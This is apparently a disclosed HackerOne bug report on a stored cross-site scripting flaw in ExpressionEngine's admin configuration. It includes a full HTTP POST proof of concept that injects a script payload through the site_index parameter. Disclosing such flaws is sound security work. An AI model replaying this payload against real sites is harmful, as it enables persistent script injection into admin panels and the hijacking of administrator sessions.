@@ -1,0 +1,35 @@
+ReportLink:https://hackerone.com/reports/26482
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/deadlock
+ReportedTo:ExpressionEngine(expressionengine)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:17.11.2014 14:30:48
+
+Summary:
+
+__Vulnerability:__ Stored XSS (Persistent)
+__Severity:__ High
+__Vulnerable Parameter:__ site_index
+__PoC:__
+```
+POST /exe/admin.php?/cp/admin_system/general_configuration&S=98be920eacf52890b4b159431a7da8cf HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://[expressionengine]/cp/admin_system/general_configuration&S=98be920eacf52890b4b159431a7da8cf
+Cookie: exp_last_visit=1408902291; exp_last_activity=1409404252; exp_csrf_token=af59ffcf6dec23ff72b698ca96c0fffe54e16f5a; exp_sessionid=4976bf69fdd9ef89a3092a9f50450c99929fc179; exp_tracker=a%3A1%3A%7Bi%3A0%3Bs%3A5%3A%22index%22%3B%7D; exp_flash=a%3A1%3A%7Bs%3A20%3A%22%3Aold%3Amessage_success%22%3Bs%3A28%3A%22Tab+Manager+has+been+updated%22%3B%7Dabc7a4d58133f0c17f48e4ff9e63ea20
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 512
+
+csrf_token=91d519eb56a4c7ebd236036a5c78587278920a46&is_system_on=y&site_name=AdminPentester&site_index=index.php958f7"><script>alert('stored xss')<%2fscript>ab44a&site_url=http%3A%2F%2Flocalhost%2Fexe%2F&theme_folder_url=http%3A%2F%2Flocalhost%2Fexe%2Fthemes%2F&theme_folder_path=%2FApplications%2FMAMP%2Fhtdocs%2Fexe%2Fthemes%2F&cp_theme=default&deft_lang=english&xml_lang=en&cache_driver=file&max_caches=150&new_version_check=y&doc_url=http%3A%2F%2Fellislab.com%2Fexpressionengine%2Fuser-guide%2F&submit=Submit
+```
+
+In the previous PoC, the payload `"><script>alert('stored xss')<%2fscript>` was injected in the `site_index` parameter. After completing the previous request and visiting any admin page, the injected payload will get executed.
+
+#__Discussion:__
+The values submitted in the `site_index` parameter is not properly sanitized leading to a stored xss vulnerability. The injected payload appears everywhere in the admin panel.
